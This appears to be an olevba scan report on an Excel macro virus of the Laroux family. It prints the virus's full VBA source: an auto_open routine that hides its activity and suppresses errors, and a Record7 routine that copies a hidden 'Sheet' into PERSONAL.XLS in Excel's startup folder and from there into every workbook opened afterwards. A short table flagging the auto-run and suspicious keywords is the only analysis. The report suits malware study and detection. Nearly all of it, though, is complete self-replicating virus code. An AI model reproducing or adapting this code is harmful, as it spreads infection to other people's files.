olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-5b1f624870398f72ff5be1d8540aa9482d17d05d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet.bas 
in file: Virus.MSExcel.Laroux-based-5b1f624870398f72ff5be1d8540aa9482d17d05d - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    Application.ScreenUpdating = False
    c$ = Application.StartupPath
    If Dir(c$) = "" Then MkDir (c$)
    SetAttr c$ & "\" & "PERSONAL.XLS", 0
    If Day(Now()) = 7 Then
        Toolbars(2).Position = xlBottom
    End If
    On Error GoTo e
    temp$ = ActiveWorkbook.Name
    Windows("PERSONAL.XLS").Close
    Kill c$ & "\" & "PERSONAL.XLS"
e:
    Application.OnSheetActivate = "Record7"
    Application.ScreenUpdating = True
End Sub
Sub Record7()
Attribute Record7.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("Sheet").Visible = True
    Sheets("Sheet").Select
    Sheets("Sheet").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("Sheet").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!Record7"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "Sheet" Then
        Workbooks("PERSONAL.XLS").Sheets("Sheet").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("Sheet").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!Record7"
    Case Else
End Select
End Sub



-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Shee
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

